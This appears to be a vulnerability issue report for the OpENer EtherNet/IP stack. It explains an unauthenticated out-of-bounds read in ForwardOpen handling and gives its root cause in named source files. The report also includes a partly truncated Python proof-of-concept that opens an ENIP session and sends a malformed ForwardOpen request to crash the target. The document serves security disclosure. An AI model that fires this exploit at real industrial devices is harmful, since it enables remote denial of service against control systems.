issue #564

Vulnerability Description

OpENer (commit 76b95cf) has an out-of-bounds read issue in Connection Manager handling of ForwardOpen requests when processing short malformed packets. An attacker can send a valid ENIP outer frame carrying a malformed CIP ForwardOpen/LargeForwardOpen request, causing the parser to continue reading fields even when request data is insufficient. This issue is remotely triggerable via network traffic and does not require authentication.

Root Cause

The root cause is the combination of parse-before-validate logic and missing remaining-length boundary checks in low-level read helpers:

In ForwardOpenRoutine() in source/src/cip/cipconnectionmanager.c, the code calls ConnectionObjectInitializeFromMessage(&(message_router_request->data), ...) before completing strict minimal-length validation.
ConnectionObjectInitializeFromMessage() in source/src/cip/cipconnectionobject.c repeatedly calls GetByteFromMessage() / GetUintFromMessage() / GetUdintFromMessage() to parse fields, but this call chain does not carry a "remaining readable length" parameter for per-read boundary checks.
GetByteFromMessage() in source/src/enet_encap/endianconv.c directly reads buffer[0] and advances the pointer; when the input pointer is already at the end of the receive buffer, it performs an out-of-bounds read.

    return (
        struct.pack("<H", command)

        + struct.pack("<I", session)
        + b"\x00" * 4
        + context[:8].ljust(8, b"\x00")

def register_session(sock: socket.socket, context: bytes) -> int:
    request = encap_header(CMD_REGISTER_SESSION, 4, 0, context) + struct.pack("<HH", 1, 0)
    sock.sendall(request)
    response = recv_enip(sock)
    if not response or len(response) < ENCAP_HEADER_LEN:
        raise RuntimeError("RegisterSession response is empty")

    cmd, _, session, status = struct.unpack("<HHII", response[:12])
    if cmd != CMD_REGISTER_SESSION or status != 0 or session == 0:
        raise RuntimeError(
            f"RegisterSession failed: cmd=0x{cmd:04x} status=0x{status:08x} session=0x{session:08x}"
        )
    return session


def send_rr(sock: socket.socket, session: int, context: bytes, cip_payload: bytes) -> Optional[bytes]:
    cpf = (
        struct.pack("<H", 2)
        + struct.pack("<H", ITEM_NULL)
        + struct.pack("<H", 0)
        + struct.pack("<H", ITEM_UCMM)
        + struct.pack("<H", len(cip_payload))
        + cip_payload
    )
    command_specific = b"\x00" * 4 + b"\x00" * 2 + cpf
    frame = encap_header(CMD_SEND_RR_DATA, len(command_specific), session, context) + command_specific
    sock.sendall(frame)
    return recv_enip(sock)


def build_large_route_path(path_len: int) -> bytes:
    if path_len < len(CM_CLASS_INSTANCE_PATH):
        raise ValueError("route path length too small")
    if path_len % 2 != 0:
        raise ValueError("route path length must be even")
    pad_len = path_len - len(CM_CLASS_INSTANCE_PATH)
    # Use member-segment bytes (0x28 + value) as safe filler.
    filler = b"\x28\x00" * (pad_len // 2)
    return CM_CLASS_INSTANCE_PATH + filler


def build_malicious_forward_open(use_large_service: bool) -> bytes:
    service = SERVICE_LARGE_FORWARD_OPEN if use_large_service else SERVICE_FORWARD_OPEN
    route_path = build_large_route_path(ROUTE_PATH_LEN)
    path_words = len(route_path) // 2
    if path_words > 0xFF:
        raise ValueError("path_words overflow")
    # No request_data bytes at all: request_data_size == 0.
    return bytes([service, path_words]) + route_path


def one_attempt(host: str, port: int, timeout: float, context: bytes, use_large_service: bool) -> str:
    cip = build_malicious_forward_open(use_large_service=use_large_service)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        session = register_session(sock, context)
        resp = send_rr(sock, session, context, cip)
        if resp is None:
            return "no response (possible crash/abort/reset)"
        return f"response_len={len(resp)}"
    finally:
        sock.close()
